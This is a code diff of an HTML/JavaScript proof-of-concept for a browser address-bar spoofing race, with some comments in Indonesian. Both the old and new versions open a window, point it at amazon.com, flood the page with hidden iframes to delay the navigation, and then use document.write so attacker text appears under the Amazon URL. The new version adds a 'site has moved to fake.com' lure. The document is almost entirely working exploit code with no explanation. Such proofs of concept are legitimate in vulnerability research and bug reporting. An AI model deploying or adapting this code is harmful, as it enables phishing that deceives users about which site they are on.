@@ -1,50 +1,60 @@
-<!DOCTYPE html>
-<html>
 <body>
-
-<a id="test" href="https://www.amazon.com/" onclick="foo();return false;">
-TAPPP/
-</a>
+<a id="test" href="https://www.amazon.com/" onclick="foo()">https://www.amazon.com/</a>
+</body>
 
 <script>
-
 var w;
 var t;
+var z;
 
-function foo(){
-
-    // buka tab attacker controlled
-    w = window.open("https://www.amazon.com:909:blank");
-
-    // tulis konten attacker dulu
-    w.document.open();
-    w.document.write("<h1>document write not amazon</h1>");
-    w.document.close();
-
-    // sedikit delay supaya render dulu
-    setTimeout(function(){
-
-        // mulai navigation ke amazon
-        w.location = "https://www.amazon.com:9090/";
-
-        // spam iframe untuk perlambat commit
-        slow();
-
-    }, 100);
-
+if(location.href.indexOf("fake") !== -1){
+    document.body.innerHTML = "<h1>This website has moved to http://fake.com</h1>";
 }
 
-// memperlambat main page supaya race lebih stabil
-function slow(){
-    for (let i=0;i<20;i++){
-        let iframe = document.createElement("iframe");
-        iframe.src="https://www.amazon.com/";
-        iframe.style="display:none";
-        document.body.appendChild(iframe);
+function foo(){
+    document.getElementById("test").href="#";
+    w = window.open("?fake");
+    t = setInterval(bar, 10);
+}
+
+function bar(){
+    try{
+        if(w.location.href !== 'about:blank'){
+            alert("Redirecting");
+            document.body.innerHTML = "<h1>Redirecting</h1>";
+            slow();
+            w.location.href = 'https://www.amazon.com/';
+            clearInterval(t);
+            z = setInterval(baz, 10);
+        }
+    } catch(e){}
+}
+
+function baz(){
+    try{
+        w.location.href;
+    } catch (e){
+        clearInterval(z);
+
+        setTimeout(function(){
+            alert("ok");
+
+            // INI BAGIAN YANG KAMU MAU
+            document.open();
+            document.write("<h1>document write not amazon</h1>");
+            document.close();
+
+        }, 3000);
     }
 }
 
+// slow down
+function slow() {
+    for (var i=0; i<10; i++ ) {
+        var iframe = document.createElement("iframe");
+        iframe.src = 'https://www.amazon.com/';
+        iframe.style = 'display:none';
+        document.body.appendChild(iframe);
+    }
+}
 </script>
-
-</body>
-</html>
